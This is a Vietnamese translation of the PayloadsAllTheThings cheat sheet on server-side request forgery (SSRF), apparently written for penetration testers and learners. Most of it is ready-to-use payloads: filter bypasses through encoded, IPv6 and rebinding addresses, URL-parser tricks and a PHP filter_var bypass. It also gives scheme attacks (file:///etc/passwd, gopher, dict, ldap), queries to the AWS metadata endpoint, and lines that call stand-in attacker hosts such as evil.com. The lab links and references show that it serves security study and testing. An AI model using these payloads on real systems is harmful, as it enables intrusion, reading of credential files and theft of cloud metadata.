# Giả mạo Yêu cầu phía Máy chủ (Server-Side Request Forgery)

> Server Side Request Forgery hay SSRF là một lỗ hổng bảo mật trong đó kẻ tấn công buộc máy chủ thực hiện các yêu cầu (request) thay mặt cho chúng.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)
* [Vượt qua bộ lọc](#bypassing-filters)
    * [Mục tiêu mặc định](#default-targets)
    * [Vượt qua Localhost bằng ký hiệu IPv6](#bypass-localhost-with-ipv6-notation)
    * [Vượt qua Localhost bằng chuyển hướng tên miền](#bypass-localhost-with-a-domain-redirect)
    * [Vượt qua Localhost bằng CIDR](#bypass-localhost-with-cidr)
    * [Vượt qua bằng địa chỉ hiếm gặp](#bypass-using-rare-address)
    * [Vượt qua bằng địa chỉ IP được mã hóa](#bypass-using-an-encoded-ip-address)
    * [Vượt qua bằng các kiểu mã hóa khác nhau](#bypass-using-different-encoding)
    * [Vượt qua bằng chuyển hướng (Redirect)](#bypassing-using-a-redirect)
    * [Vượt qua bằng DNS Rebinding](#bypass-using-dns-rebinding)
    * [Vượt qua bằng cách lợi dụng sự khác biệt khi phân tích URL](#bypass-abusing-url-parsing-discrepancy)
    * [Vượt qua hàm filter_var() của PHP](#bypass-php-filter_var-function)
    * [Vượt qua bằng JAR Scheme](#bypass-using-jar-scheme)
    * [Vượt qua bằng TLD localhost](#bypass-using-tld-localhost)
* [Khai thác qua URL Scheme](#exploitation-via-url-scheme)
    * [file://](#file)
    * [http://](#http)
    * [dict://](#dict)
    * [sftp://](#sftp)
    * [tftp://](#tftp)
    * [ldap://](#ldap)
    * [gopher://](#gopher)
    * [netdoc://](#netdoc)
* [Khai thác mù (Blind Exploitation)](#blind-exploitation)
* [Nâng cấp lên XSS](#upgrade-to-xss)
* [Bài lab](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - Công cụ dò lỗi (fuzzer) và khai thác SSRF tự động
* [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - Tạo liên kết gopher để khai thác SSRF và chiếm quyền RCE trên nhiều loại máy chủ khác nhau
* [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - Công cụ quét dựa trên Python để tìm các tham số có khả năng bị SSRF
* [teknogeek/SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff) - Công cụ kiểm thử SSRF đơn giản viết bằng Go
* [assetnote/surf](https://github.com/assetnote/surf) - Trả về danh sách các ứng viên có khả năng bị SSRF
* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - Công cụ cực nhanh, an toàn luồng (thread-safe), đơn giản và không cấp phát bộ nhớ, dùng để tạo nhanh các cách biểu diễn thay thế cho địa chỉ IP(v4) bằng Go.
* [Horlad/r3dir](https://github.com/Horlad/r3dir) - dịch vụ chuyển hướng được thiết kế để giúp vượt qua các bộ lọc SSRF không kiểm tra vị trí chuyển hướng. Được tích hợp với Burp nhờ các tag Hackvertor

## Phương pháp

SSRF là một lỗ hổng bảo mật xảy ra khi kẻ tấn công thao túng máy chủ để thực hiện các yêu cầu HTTP tới một vị trí không mong muốn. Điều này xảy ra khi máy chủ xử lý URL hoặc địa chỉ IP do người dùng cung cấp mà không kiểm tra hợp lệ đúng cách.

Các hướng khai thác phổ biến:

* Truy cập Cloud metadata
* Rò rỉ tệp tin trên máy chủ
* Dò tìm mạng, quét cổng (port scanning) thông qua SSRF
* Gửi gói tin đến các dịch vụ cụ thể trên mạng, thường nhằm đạt được khả năng Thực thi Lệnh Từ xa (Remote Command Execution) trên một máy chủ khác

**Ví dụ**: Một máy chủ nhận đầu vào từ người dùng để lấy dữ liệu từ một URL.

```py
url = input("Enter URL:")
response = requests.get(url)
return response
```

Kẻ tấn công cung cấp một đầu vào độc hại:

```ps1
http://169.254.169.254/latest/meta-data/
```

Yêu cầu này lấy thông tin nhạy cảm từ dịch vụ metadata của AWS EC2.

## Vượt qua bộ lọc

### Mục tiêu mặc định

Theo mặc định, Server-Side Request Forgery được dùng để truy cập các dịch vụ chạy trên `localhost` hoặc ẩn sâu hơn trong mạng nội bộ.

* Dùng `localhost`

  ```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
  ```

* Dùng `127.0.0.1`

  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
  ```

* Dùng `0.0.0.0`

  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
  ```

### Vượt qua Localhost bằng ký hiệu IPv6

* Dùng địa chỉ không xác định trong IPv6 `[::]`

    ```powershell
    http://[::]:80/
    ```

* Dùng địa chỉ loopback IPv6 `[0000::1]`

    ```powershell
    http://[0000::1]:80/
    ```

* Dùng [Nhúng địa chỉ IPv6/IPv4](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

    ```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
    ```

### Vượt qua Localhost bằng chuyển hướng tên miền

| Tên miền                     | Chuyển hướng đến |
|------------------------------|-------------|
| localtest.me                 | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |

Dịch vụ `nip.io` rất hữu ích cho việc này, nó sẽ chuyển đổi bất kỳ địa chỉ IP nào thành một bản ghi DNS.

```powershell
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```

### Vượt qua Localhost bằng CIDR

Dải IP `127.0.0.0/8` trong IPv4 được dành riêng cho các địa chỉ loopback.

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

Nếu bạn thử dùng bất kỳ địa chỉ nào trong dải này (127.0.0.2, 127.1.1.1, v.v.) trong một mạng, nó vẫn sẽ trỏ về máy cục bộ (local machine).

### Vượt qua bằng địa chỉ hiếm gặp

Bạn có thể viết tắt địa chỉ IP bằng cách bỏ bớt các số 0

```powershell
http://0/
http://127.1
http://127.0.1
```

### Vượt qua bằng địa chỉ IP được mã hóa

* Vị trí IP dạng thập phân

    ```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
    ```

* IP dạng bát phân (Octal): Các cách triển khai khác nhau xử lý định dạng bát phân của IPv4 theo cách khác nhau.

    ```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
    ```

* IP dạng thập lục phân (Hex)

    ```powershell
    http://0x7f000001 = http://127.0.0.1
    http://0xc0a80101 = http://192.168.1.1
    http://0xa9fea9fe = http://169.254.169.254
    ```

### Vượt qua bằng các kiểu mã hóa khác nhau

* Mã hóa URL: Mã hóa đơn hoặc mã hóa kép một URL cụ thể để vượt qua danh sách đen (blacklist)

    ```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
    ```

* Ký tự chữ-số được bao khung: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`

    ```powershell
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
    ```

* Mã hóa Unicode: Trong một số ngôn ngữ (.NET, Python 3), regex hỗ trợ Unicode theo mặc định. `\d` bao gồm `0123456789` nhưng cũng bao gồm cả `๐๑๒๓๔๕๖๗๘๙`.

### Vượt qua thông qua tên máy chủ (hostname) ipv6

* Trong Linux, tệp /etc/hosts có chứa dòng `::1   localhost ip6-localhost ip6-loopback`, nhưng chỉ hoạt động nếu máy chủ http đang chạy trên ipv6

   ```powershell
   http://ip6-localhost = ::1
   http://ip6-loopback = ::1
   ```

### Vượt qua bằng chuyển hướng (Redirect)

1. Tạo một trang trên host nằm trong danh sách trắng (whitelist) để chuyển hướng các yêu cầu tới URL mục tiêu của SSRF (ví dụ: 192.168.0.1)
2. Kích hoạt SSRF trỏ tới `vulnerable.com/index.php?url=http://redirect-server`
3. Bạn có thể dùng mã phản hồi [HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) và [HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) để giữ nguyên phương thức HTTP và phần thân (body) sau khi chuyển hướng.

Để thực hiện chuyển hướng mà không cần tự host một máy chủ chuyển hướng, hoặc để dò tìm mục tiêu chuyển hướng một cách liền mạch, hãy dùng [Horlad/r3dir](https://github.com/Horlad/r3dir).

* Chuyển hướng đến `http://localhost` với mã trạng thái `307 Temporary Redirect`

    ```powershell
    https://307.r3dir.me/--to/?url=http://localhost
    ```

* Chuyển hướng đến `http://169.254.169.254/latest/meta-data/` với mã trạng thái `302 Found`

    ```powershell
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
    ```

### Vượt qua bằng DNS Rebinding

Tạo một tên miền thay đổi qua lại giữa hai địa chỉ IP.

* [1u.ms](http://1u.ms) - Công cụ hỗ trợ DNS rebinding

Ví dụ để xoay vòng giữa `1.2.3.4` và `169.254-169.254`, dùng tên miền sau:

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

Xác minh địa chỉ bằng `nslookup`.

```ps1
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```

### Vượt qua bằng cách lợi dụng sự khác biệt khi phân tích URL

[Kỷ nguyên mới của SSRF - Khai thác lỗi phân tích URL trong các ngôn ngữ lập trình phổ biến - Nghiên cứu của Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)

Hành vi phân tích của các thư viện khác nhau: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`.

* `urllib2` xem `1.1.1.1` là đích đến
* `requests` và trình duyệt chuyển hướng đến `2.2.2.2`
* `urllib` phân giải thành `3.3.3.3`
* Một số bộ phân tích thay thế `http:127.0.0.1/` thành `http://127.0.0.1/`

### Vượt qua hàm filter_var() của PHP

Trong PHP 7.0.25, hàm `filter_var()` với tham số `FILTER_VALIDATE_URL` cho phép các URL như:

* `http://test???test.com`
* `0://evil.com:80;http://google.com:80/`

```php
<?php 
 echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
 echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```

### Vượt qua bằng TLD localhost

Từng có một tld dành riêng tên là `.localhost`, nó có thể chấp nhận các tên miền tùy ý và phân giải về địa chỉ localhost, đây là một ví dụ

```powershell
$ ping PayloadsAllTheThings.localhost -c 1
PING PayloadsAllTheThings.localhost (::1) 56 data bytes
64 bytes from ip6-localhost (::1): icmp_seq=1 ttl=64 time=0.070 ms

--- PayloadsAllTheThings.localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.070/0.070/0.070/0.000 ms
```

### Vượt qua bằng JAR Scheme

Kỹ thuật tấn công này hoàn toàn mù (blind), bạn sẽ không thấy được kết quả.

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## Khai thác qua URL Scheme

### File

Cho phép kẻ tấn công lấy nội dung của một tệp trên máy chủ. Biến SSRF thành lỗ hổng đọc tệp (file read).

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### HTTP

Cho phép kẻ tấn công lấy bất kỳ nội dung nào từ web, cũng có thể dùng để quét cổng.

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

![SSRF stream](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true)

### Dict

URL scheme DICT được dùng để tham chiếu đến các định nghĩa hoặc danh sách từ có sẵn thông qua giao thức DICT:

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### SFTP

Một giao thức mạng dùng để truyền tệp an toàn qua secure shell

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### TFTP

Trivial File Transfer Protocol, hoạt động qua UDP

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### LDAP

Lightweight Directory Access Protocol. Đây là một giao thức ứng dụng được dùng qua mạng IP để quản lý và truy cập dịch vụ thông tin thư mục phân tán.

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### Netdoc

Wrapper dành cho Java khi payload của bạn gặp khó khăn với các ký tự "`\n`" và "`\r`".

```powershell
ssrf.php?url=netdoc:///etc/passwd
```

### Gopher

Giao thức `gopher://` là một giao thức nhẹ, dựa trên văn bản, có trước World Wide Web hiện đại. Nó được thiết kế để phân phối, tìm kiếm và truy xuất tài liệu qua Internet.

```ps1
gopher://[host]:[port]/[type][selector]
```

Scheme này rất hữu ích vì nó có thể được dùng để gửi dữ liệu tới giao thức TCP.

```ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

Tham khảo phần Khai thác Nâng cao SSRF để tìm hiểu sâu hơn về giao thức `gopher://`.

## Khai thác mù (Blind Exploitation)

> Khi khai thác server-side request forgery, chúng ta thường gặp tình huống không thể đọc được phản hồi trả về.

Sử dụng một chuỗi SSRF để lấy dữ liệu ra ngoài băng thông (Out-of-Band): [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

**Có thể thực hiện qua HTTP(s)**:

* [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
* [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
* [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
* [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
* [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
* [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
* [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
* [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
* [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
* [Các sản phẩm Atlassian khác](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
* [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
* [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
* [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
* [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
* [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
* [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**Có thể thực hiện qua Gopher**:

* [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
* [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
* [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)

## Nâng cấp lên XSS

Khi SSRF không gây tác động nghiêm trọng, mạng bị phân đoạn (segmented) khiến bạn không thể truy cập máy khác, và SSRF không cho phép bạn lấy tệp ra khỏi máy chủ.

Bạn có thể thử nâng cấp SSRF thành XSS, bằng cách chèn một tệp SVG chứa mã Javascript.

```bash
https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
```

## Bài lab

* [PortSwigger - SSRF cơ bản nhắm vào máy chủ cục bộ](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
* [PortSwigger - SSRF cơ bản nhắm vào một hệ thống backend khác](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
* [PortSwigger - SSRF với bộ lọc đầu vào dựa trên danh sách đen](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
* [PortSwigger - SSRF với bộ lọc đầu vào dựa trên danh sách trắng](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
* [PortSwigger - SSRF vượt bộ lọc qua lỗ hổng chuyển hướng mở (open redirection)](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
* [Root Me - Server Side Request Forgery](https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery)
* [Root Me - Nginx - Cấu hình sai SSRF](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)

## Tài liệu tham khảo

* [A New Era Of SSRF - Exploiting URL Parsers - Orange Tsai - September 27, 2017](https://web.archive.org/web/20171219113122/https://www.youtube.com/watch?v=D1S-G8rJrEk)
* [Blind SSRF on errors.hackerone.net - chaosbolt - June 30, 2018](https://web.archive.org/web/20180711141712/https://hackerone.com/reports/374737)
* [ESEA Server-Side Request Forgery and Querying AWS Meta Data - Brett Buerhaus - April 18, 2016](https://web.archive.org/web/20251203033430/https://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/)
* [Hacker101 SSRF - Cody Brocious - October 29, 2018](https://web.archive.org/web/20240905134609/https://www.youtube.com/watch?v=66ni2BTIjS8)
* [Hackerone - How To: Server-Side Request Forgery (SSRF) - Jobert Abma - June 14, 2017](https://web.archive.org/web/20210805121112/https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
* [Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity - December 17, 2017](http://web.archive.org/web/20171220083457/http://www.sxcurity.pro/2017/12/17/hackertarget/)
* [How I Chained 4 Vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! - Orange Tsai - July 28, 2017](https://web.archive.org/web/20260305031002/https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
* [Les Server Side Request Forgery : Comment contourner un pare-feu - Geluchat - September 16, 2017](https://web.archive.org/web/20250514163556/https://www.dailysecurity.fr/server-side-request-forgery/)
* [PHP SSRF - @secjuice - theMiddle - March 1, 2018](https://web.archive.org/web/20180308041252/https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
* [Piercing the Veil: Server Side Request Forgery to NIPRNet Access - Alyssa Herrera - April 9, 2018](https://web.archive.org/web/20180418081910/https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
* [Server-side Browsing Considered Harmful - Nicolas Grégoire (Agarri) - May 21, 2015](https://web.archive.org/web/20260212042925/https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
* [SSRF - Server-Side Request Forgery (Types and Ways to Exploit It) Part-1 - SaN ThosH (madrobot) - January 10, 2019](https://web.archive.org/web/20260111214124/https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
* [SSRF and Local File Read in Video to GIF Converter - sl1m - February 11, 2016](https://web.archive.org/web/20250426211714/https://hackerone.com/reports/115857)
* [SSRF in https://imgur.com/vidgif/url - Eugene Farfel (aesteral) - February 10, 2016](https://web.archive.org/web/20250905152736/https://hackerone.com/reports/115748)
* [SSRF in proxy.duckduckgo.com - Patrik Fábián (fpatrik) - May 27, 2018](https://web.archive.org/web/20250623102403/https://hackerone.com/reports/358119)
* [SSRF on *shopifycloud.com - Rojan Rijal (rijalrojan) - July 17, 2018](https://web.archive.org/web/20250623094825/https://hackerone.com/reports/382612)
* [SSRF Protocol Smuggling in Plaintext Credential Handlers: LDAP - Willis Vandevanter (@0xrst) - February 5, 2019](https://web.archive.org/web/20260115204744/https://www.silentrobots.com/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
* [SSRF Tips - xl7dev - July 3, 2016](http://web.archive.org/web/20170407053309/http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
* [SSRF's Up! Real World Server-Side Request Forgery (SSRF) - Alberto Wilson and Guillermo Gabarrin - January 25, 2019](https://web.archive.org/web/20260219110439/https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
* [SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例 - mrtc0 - September 5, 2018](https://web.archive.org/web/20250717205545/https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
* [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - June 12, 2019](https://github.com/allanlw/svg-cheatsheet)
* [URL Eccentricities in Java - sammy (@PwnL0rd) - November 2, 2020](http://web.archive.org/web/20201107113541/https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
* [Web Security Academy Server-Side Request Forgery (SSRF) - PortSwigger - July 10, 2019](https://web.archive.org/web/20190710130620/https://portswigger.net/web-security/ssrf)
* [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG (@quanyang) - June 22, 2016](https://web.archive.org/web/20260301043216/https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
